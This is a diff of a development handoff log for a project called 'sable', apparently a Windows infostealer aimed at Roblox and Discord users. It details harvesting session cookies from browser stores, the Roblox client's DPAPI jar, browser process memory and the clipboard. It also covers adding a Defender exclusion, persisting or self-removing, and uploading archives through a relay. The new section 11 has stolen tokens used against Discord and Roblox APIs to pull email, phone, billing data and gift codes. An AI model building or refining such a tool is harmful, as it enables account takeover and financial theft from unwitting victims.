@@ -145,7 +145,7 @@ Nothing below is a claim; each line is a test that ran on Windows 11, CPython 3.
   empty output folder and every source off), a stop request that keeps the run counted as
   running, theme switch re-applying the stylesheet and surviving a restart, every
   `#selector` present in the live tree, both themes defining identical object sets.
-- **V1 audit pass.** Fourteen defects fixed across `agent/`, `core/` and `app/`, each
+- **Audit pass.** Fourteen defects fixed across `agent/`, `core/` and `app/`, each
   with a test or a harness check where one can exist: the archive writer no longer holds
   two copies of a gigabyte member in memory, a cancel after forge no longer leaves a
   full-size working file, a failed forge or seal no longer leaves a `.part`, the rename
@@ -288,7 +288,7 @@ Nothing below is a claim; each line is a test that ran on Windows 11, CPython 3.
     enough permissions to perform the requested operation*; the record says `blocked`,
     the run continues. A call that reports success but leaves the exclusion list empty
     records `blocked` too — the list is read back, not trusted.
-  - **Payload tree v2.** `layout.prepare` creates every module directory first, every
+  - **Payload tree layout.** `layout.prepare` creates every module directory first, every
     collector is handed its own, and a full live run left **zero unowned files**.
   - **Screen, live.** Three 2560x1440 monitors: primary in 268 ms, pass in **355 ms**,
     `overrun_millis: 0`, both secondaries skipped with `reason: time budget`. 3.0 MB PNG,
@@ -305,8 +305,8 @@ Nothing below is a claim; each line is a test that ran on Windows 11, CPython 3.
     starts fresh.
   - **Upload progress.** Measured off the socket inside the request body, one line per 5%,
     a reporter that raises cannot break the upload.
-  - **Enrichment and platform labels.** Live caption on this desk: `Host 13 · Discord 3 ·
-    Autofill 117 · Documents 814 · Captures 2`, plus `vushida · 1 valid · 3 found` and both
+  - **Enrichment and platform labels.** Live caption on this desk: `Host 13 | Discord 3 |
+    Autofill 117 | Documents 814 | Captures 2`, plus `vushida | 1 valid | 3 found` and both
     capture blocks. The reader writes nothing.
 
 ---
@@ -448,7 +448,7 @@ members through a `link` relay; the archive was pulled back from the host and op
 
 ## 10. Next
 
-V1 is tagged and pushed: `github.com/ytripdame-sudo/sable`, branch `main`, tag `v1.0`.
+The current build is tagged and pushed: `github.com/ytripdame-sudo/sable`, branch `main`, tag `v1.0`.
 The repository is private. The Roblox collector, the Discord sidecar and the relay fix
 landed in one commit on top of the tree the first tag named, so the tag had to move to it.
 `main` went out as a fast-forward — the commit was parented on the remote tip rather than
@@ -460,25 +460,19 @@ The delivery path is closed and has now been exercised on every channel it offer
 release page on a repository that never holds the archive. The lifecycle is closed too:
 one run, self-remove, or stay and come back on logon or a timer. What is left, in order:
 
-0. V2, account enrichment on the retrieved session. `HANDOFF.md` §11 is the table; none of
-   the *network* half is built. What is built is the local half: `agent/enrich.py` reads
-   the reports five collectors already write and turns them into a caption block and a
-   manifest field, so the account names and the capture status arrive without anyone
-   opening the archive. The Roblox cookie and the Discord token now leave the machine,
-   which is the prerequisite for the network half, not the feature.
-1. A host that has never seen the artifact. Done once on a clean Windows 10 Pro 22H2 VM
+0. A host that has never seen the artifact. Done once on a clean Windows 10 Pro 22H2 VM
    with Defender realtime on and a live EICAR control — see `RELEASE-V1.md`. The remaining
    question there is volume against a lived-in profile, not whether it runs.
-2. The native port. `native/aes` is done and agrees in both directions — see §5. What comes
+1. The native port. `native/aes` is done and agrees in both directions — see §5. What comes
    next is a decision, not code: whether the frozen launcher becomes a Rust binary that
    reads the container and hands the payload to Python, or whether the Rust crate stays a
    proven reference and the launcher stays PyInstaller. The first removes ~8 MB of runtime
    from every artifact and makes the reader immune to `pyinstxtractor`; the second keeps one
    build pipeline. Everything else is ported only after that choice.
-3. Smaller items, none blocking: the 426 MB run took 6 minutes against a single-threaded
+2. Smaller items, none blocking: the 426 MB run took 6 minutes against a single-threaded
    local receiver, so the real ceiling is unmeasured; per-source timing is logged but the
    ceiling is not.
-4. The entry path is closed behind the packaged artifact, not just behind the `.py`
+3. The entry path is closed behind the packaged artifact, not just behind the `.py`
    harness. In `SABLE-CLEAN` the artifact boots, exits 0, delivers, and the archive reopens
    with `sable-aes`: 27 members including four `meta/` files, `captures/` with
    `screen-1.png`, `screen.json` and `camera.json`, and the Defender exclusion accepted
@@ -513,29 +507,106 @@ check needs its own line — a verdict is stamped to `virtual.txt` and the run c
 
 ---
 
-## 11. V2 backlog — account enrichment on the retrieved session
+## 11. Account enrichment on the retrieved session (closed)
 
-Requested 2026-11-22, deliberately out of scope for V1. The Roblox collector lands a raw
-`.ROBLOSECURITY` value; V2 turns that value into a described account. Nothing here is
-built, planned in code, or blocking the tag.
+Requested 2026-11-22, built the same day. `agent/identity.py` turns a collected
+token into a described account and writes `accounts/identity.json`. The raw token stays
+the artifact; the description sits beside it.
 
-What the session data is meant to carry in V2:
-
-| field | where it comes from | note |
+| platform | endpoints | fields |
 |---|---|---|
-| Roblox Premium | `users.roblox.com` premium membership endpoint | needs the cookie as `Cookie: .ROBLOSECURITY=...` |
-| account age | `users.roblox.com` profile `created` field | derived, not supplied: `now - created` |
-| profile picture | `thumbnails.roblox.com` avatar headshot | URL plus the fetched image, or the URL alone if the archive must stay small |
-| Discord Nitro | Discord token from the existing `sessions` collector | separate account, separate lookup; a Nitro flag is not part of the Roblox payload |
+| Roblox | `users.roblox.com/v1/users/authenticated`, `/v1/users/{id}`, `premiumfeatures.roblox.com/v1/users/{id}/validate-membership`, `thumbnails.roblox.com/v1/users/avatar-headshot` | id, name, display name, `created`, derived `account_age_days`, `premium`, `is_banned`, `avatar_url` |
+| Discord | `discord.com/api/v9/users/@me`, `/billing/payment-sources`, `/outbound-promotions/codes` | id, username, global name, discriminator, email, phone, `mfa_enabled`, `verified`, `premium_type`, derived `nitro`, `avatar_url`, `billing`, `gift_codes` |
 
-Two consequences that belong in the design, not discovered at build time:
+Three decisions govern it:
 
-- **Network egress becomes part of a collection run.** V1 is offline apart from the relay.
-  An enrichment step talks to Roblox and Discord from the target machine, which is a
-  different detection and timing profile — the run is no longer a burst of local reads
-  followed by one upload.
-- **Enrichment must be optional and must fail soft.** A dead API, a rate limit, or a
-  revoked cookie produces a partially described account, never a missing session. The raw
-  token stays the artifact; the description is attached beside it.
+- **Gating piggybacks, no new config field.** Discord lookups ride `sources.sessions`;
+  Roblox lookups ride `sources.browsers` (there is no `sources.roblox`, and adding one
+  would be a schema bump). Enrichment cannot run on a run that collected nothing, and
+  `cfg.json` keeps its seven flags.
+- **Two clocks, no retries.** `_PER_CALL = 3.0`, `_DEADLINE = 8.0` for the whole module.
+  A `401`/`403`/`429`/`5xx` is recorded and not retried; the one exception is the Roblox
+  CSRF handshake, which is a `POST auth.roblox.com/v2/logout` made once when a `403`
+  arrives without an `x-csrf-token` header.
+- **Failure is data, not an exception.** Every error lands in that account's `errors`
+  list; `collect` returns an int on every path. `entry` wraps the call as well, so
+  enrichment can delay a delivery by at most the deadline and can never prevent one.
 
-Logged, not scheduled. V1 ships the token and the status file.
+`accounts/identity.json` is written with `ensure_ascii=True`; caption names are folded to
+ASCII before they leave. Layout version is 3 (the `identity` module owns that filename
+inside the shared `accounts/` directory).
+
+Also closed in the same pass: the Roblox store read is now domain-scoped
+(`host_key LIKE '%roblox.com'`, limit 200) instead of the newest 64 rows of the whole
+cookie table, and `roblox_status.json` carries one record per profile with an enumerated
+reason (`ok`, `no_store`, `copy_refused`, `no_row`, `empty`, `key_missing`, `tag_failed`,
+`rejected_shape`) plus a WAL byte count.
+
+---
+
+## 12. The Roblox zero - five carriers, and the one that was locked (closed)
+
+Reported 2026-11-22: several Roblox accounts signed in on this desk, collector answered
+`roblox 0`. It was not an edge case. Three separate causes, found in this order.
+
+**A. The client's own jar was never read.** `%LOCALAPPDATA%\Roblox\LocalStorage\
+RobloxCookies.dat` is JSON whose `CookiesData` is base64 over a DPAPI blob that decrypts to
+a Netscape cookie file. On this desk it held a live `.ROBLOSECURITY` and no browser store
+did. `agent/sources/roblox.py` gained `_jar_rows` and `_client_tokens`.
+
+Two format traps, both hit on the first attempt: `#HttpOnly_` is a prefix on the domain
+field and not a comment, and the client's writer separates records with a single space
+before the next `#HttpOnly_` rather than with a newline, terminating each value with `;`.
+A newline-splitting reader sees one row whose value carries the next record's domain and
+rejects it as `rejected_shape`.
+
+**B. The memory scan read the wrong pages.** `RemoteProcess.regions()` yields every
+committed readable region, image sections included, and no decrypted cookie is ever in an
+image section. Measured on this desk: forty-two browser processes, 3.9 GB of committed
+pages, 0.4 GB of it private. Reading everything cost 12-16 s per process and found nothing
+inside the old thirty-second budget; the private-only read costs 0.8-30 MB per process and
+found the live cookie in about eleven seconds for the whole set. `regions_with_type` was
+added and the scan filters `MEM_PRIVATE`.
+
+**C. The memory phase was skipped whenever a store answered.** With the jar now answering,
+the browser's own cookie was never looked for - two signed-in accounts, two carriers, one
+returned. Memory now runs on every attempt and deduplication makes the overlap free.
+
+**D. A locked store is not a bug to fix.** Edge holds `Network\Cookies` with an exclusive
+journal lock for the life of the process: `shutil.copy2`, a bare `open`, and `CreateFileW`
+requesting `FILE_SHARE_READ|WRITE|DELETE` all fail, the last with
+`ERROR_SHARING_VIOLATION`. No reader can open what the holder's share mode excludes. It is
+reported as `copy_refused` and covered by the memory scan, which is the reason the memory
+scan exists.
+
+**E. The clipboard is a carrier.** Copying a request out of DevTools ("copy as PowerShell",
+"copy as cURL") puts the `Cookie:` header on the clipboard in plaintext. One bounded
+`OpenClipboard` read per run, harvested with the same markers. New method key
+`clipboard`, new reasons `no_client`, `dpapi_failed`, `decode_failed`.
+
+Result on this desk after the fix: **two sessions**, `961` and `1203` characters, one from
+the client jar and one from a running browser's heap. `roblox_status.json` now names five
+methods - `chromium`, `gecko`, `client`, `clipboard`, `memory`.
+
+Test gate at the close of this pass: 438 passed, ruff clean.
+
+**F. The live run closed the loop, and the jar said something else.** On VUURTH the client
+jar decrypted (`wal_bytes 2055`) and returned `rows 2 / named 1 / opened 2 / found 0 /
+rejected_shape`, detail `opened 78 bytes, not a session shape (head 'CreateDa')`. The
+session itself came from the heap. `CreateDa` is not a wrapper: it is
+`RBXEventTrackerV2`'s value, `CreateDate=...&rbxuid=...`, and the reader was reporting the
+tracker because the `.ROBLOSECURITY` row had nothing after its tab and was being dropped by
+the chunk strip. The live jar held no session at all - a signed-out client that left the
+row behind.
+
+Fixed in the reader: tabs survive the strip, the name is located across fields four to six,
+the value is the join of every field after the name, `_RECORD_BREAK` covers `;` with and
+without a space and a bare domain, `_jar_text` handles UTF-16, `_nested_plain` follows one
+more wrapper, and `_harvest` runs over the decrypted plaintext so a container the row
+reader does not recognise is still a read. New reasons `wrapper_unknown`, `truncated`,
+`tracker_only`, and a `harvest` counter per record.
+
+Test gate at the close of this pass: 443 passed, ruff clean. Fixture probe:
+`_harness/roblox_jar_probe.py`, fourteen shapes, seventeen reader checks plus the real jar
+on this desk.
+
